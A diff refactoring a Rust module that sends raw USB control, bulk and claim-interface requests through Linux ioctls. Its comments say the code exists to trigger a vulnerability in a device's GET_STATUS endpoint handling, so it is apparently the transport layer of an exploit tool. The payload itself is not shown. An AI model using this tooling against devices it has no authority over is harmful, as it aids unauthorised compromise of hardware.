@@ -1,14 +1,13 @@
-use std::mem::size_of;
-
 use regex::Regex;
+use std::mem::size_of;
 use std::os::fd::AsRawFd;
 use std::{fs, fs::OpenOptions, path::PathBuf};
 use walkdir::WalkDir;
 
-// USB Control Transfer Request definition
-// include/uapi/linux/usbdevice_fs.h:40
+// USB IOCTL request definitions
+// include/uapi/linux/usbdevice_fs.h
 #[repr(C)]
-struct USBControlTransfer {
+pub struct UsbControlTransfer {
     req_type: u8,
     req: u8,
     value: u16,
@@ -18,10 +17,8 @@ struct USBControlTransfer {
     data: *mut libc::c_void,
 }
 
-// USB Bulk Transfer Request definition
-// include/uapi/linux/usbdevice_fs.h:50
 #[repr(C)]
-struct USBBulkTransfer {
+pub struct UsbBulkTransfer {
     ep: u32,
     len: u32,
     timeout: u32,
@@ -29,13 +26,13 @@ struct USBBulkTransfer {
 }
 
 #[repr(C)]
-struct USBClaimInterface {
+pub struct UsbClaimInterface {
     interface: u32,
 }
 
 // IOCTL Operation number
 // Defined as a recursive macro in the kernel
-// include/uapi/linux/usbdevice_fs.h:187
+// include/uapi/linux/usbdevice_fs.h
 // #define USBDEVFS_CONTROL _IOWR('U', 0, struct usbdevfs_ctrltransfer)
 
 // include/uapi/asm-generic/ioctl.h
@@ -54,9 +51,10 @@ struct USBClaimInterface {
 // #define _IOC_SIZESHIFT	(_IOC_TYPESHIFT+_IOC_TYPEBITS)
 // #define _IOC_DIRSHIFT	(_IOC_SIZESHIFT+_IOC_SIZEBITS)
 
+// Generate valid IOCTL operation number based on the USB Request type
 #[inline(always)]
 const fn ioc_usbdev(direction: u32, request_size: u32, request_number: u32) -> u32 {
-    // For the sake of readability and matching with the Linux Kernel
+    // We follow the exact linux kernel design so it is easir to track bugs during development
     const NRBITS: u32 = 8;
     const TYPEBITS: u32 = 8;
     const SIZEBITS: u32 = 14;
@@ -72,31 +70,27 @@ const fn ioc_usbdev(direction: u32, request_size: u32, request_number: u32) -> u
         | (request_size << SIZESHIFT)
 }
 
-// ioctl operation numbers
+// IOCTL operation numbers
 const IOC_WRITE: u32 = 0x01;
 const IOC_READ: u32 = 0x02;
-const IOCTL_USB_CTRL: u32 = ioc_usbdev(
-    IOC_READ | IOC_WRITE,
-    size_of::<USBControlTransfer>() as u32,
-    0,
-);
-const IOCTL_USB_BULK: u32 =
-    ioc_usbdev(IOC_READ | IOC_WRITE, size_of::<USBBulkTransfer>() as u32, 2);
-const IOCTL_USB_CLAIM_INTERFACE: u32 =
-    ioc_usbdev(IOC_READ, size_of::<USBClaimInterface>() as u32, 15);
 
+// Macro to assign IOCTL number to kernel USB request structs
 trait IoctlRequest {
     const IOCTL: libc::c_ulong;
 }
-impl IoctlRequest for USBControlTransfer {
-    const IOCTL: libc::c_ulong = IOCTL_USB_CTRL as libc::c_ulong;
+macro_rules! impl_ioctl {
+    ($type:ty, $direction:expr, $number:expr) => {
+        impl IoctlRequest for $type {
+            const IOCTL: libc::c_ulong =
+                ioc_usbdev($direction, size_of::<$type>() as u32, $number) as libc::c_ulong;
+        }
+    };
 }
-impl IoctlRequest for USBBulkTransfer {
-    const IOCTL: libc::c_ulong = IOCTL_USB_BULK as libc::c_ulong;
-}
-impl IoctlRequest for USBClaimInterface {
-    const IOCTL: libc::c_ulong = IOCTL_USB_CLAIM_INTERFACE as libc::c_ulong;
-}
+
+// Definition of the transfer with the IOCTL trait
+impl_ioctl!(UsbControlTransfer, IOC_READ | IOC_WRITE, 0);
+impl_ioctl!(UsbBulkTransfer, IOC_READ | IOC_WRITE, 2);
+impl_ioctl!(UsbClaimInterface, IOC_READ, 15);
 
 // Read hexadecimal format integer from a file
 fn read_hex_from_file(path: &PathBuf) -> Option<u16> {
@@ -159,12 +153,12 @@ impl USBDevice {
 
     // Claim interface
     pub fn claim_interface(&self, interface: u32) -> std::io::Result<()> {
-        let mut claim_if_request = USBClaimInterface { interface };
-        self.write(&mut claim_if_request)
+        let mut claim_if_request = UsbClaimInterface { interface };
+        self.issue_request(&mut claim_if_request)
     }
 
-    // Send a URB request through ioctl
-    fn write<T: IoctlRequest>(&self, request: &mut T) -> std::io::Result<()> {
+    // Send a USB request through ioctl
+    fn issue_request<T: IoctlRequest>(&self, request: &mut T) -> std::io::Result<()> {
         unsafe {
             let device_fd = self.device_file.as_raw_fd();
             // Synchronous write call
@@ -177,18 +171,18 @@ impl USBDevice {
     }
 
     // Send a Bulk request
-    pub fn write_bulk(&self, endpoint: u32, buf: &mut [u8]) -> std::io::Result<()> {
-        let mut bulk_request = USBBulkTransfer {
+    pub fn issue_bulk_request(&self, endpoint: u32, buf: &mut [u8]) -> std::io::Result<()> {
+        let mut bulk_transfer = UsbBulkTransfer {
             ep: endpoint,
             len: buf.len() as u32,
             timeout: 1000,
             data: (buf.as_mut_ptr() as *mut u32).cast::<libc::c_void>(),
         };
-        self.write(&mut bulk_request)
+        self.issue_request(&mut bulk_transfer)
     }
 
     // Send a Control request
-    pub fn write_control(&self, buf: &mut [u8]) -> std::io::Result<()> {
+    pub fn issue_control_request(&self, buf: &mut [u8]) -> std::io::Result<()> {
         // It is important to note that this is not an usb driver, therefore, we will set some
         // values in the control request to specific defaults. The idea is to use this to trigger
         // the vulnerability
@@ -199,7 +193,7 @@ impl USBDevice {
         const USB_REQ_GET_STATUS: u8 = 0x0;
         // The vulnerable code in the switch executes on Get status requests where the recipient is
         // an endpoint
-        let mut control_request = USBControlTransfer {
+        let mut control_transfer = UsbControlTransfer {
             req_type: USB_DIR_IN | USB_TYPE_STANDARD | USB_RECIP_ENDPOINT, // Direction | Type | Recipient
             req: USB_REQ_GET_STATUS,                                       // GET request code
             value: 0,
@@ -208,6 +202,6 @@ impl USBDevice {
             timeout: 1000,
             data: (buf.as_mut_ptr() as *mut u32).cast::<libc::c_void>(),
         };
-        self.write(&mut control_request)
+        self.issue_request(&mut control_transfer)
     }
 }
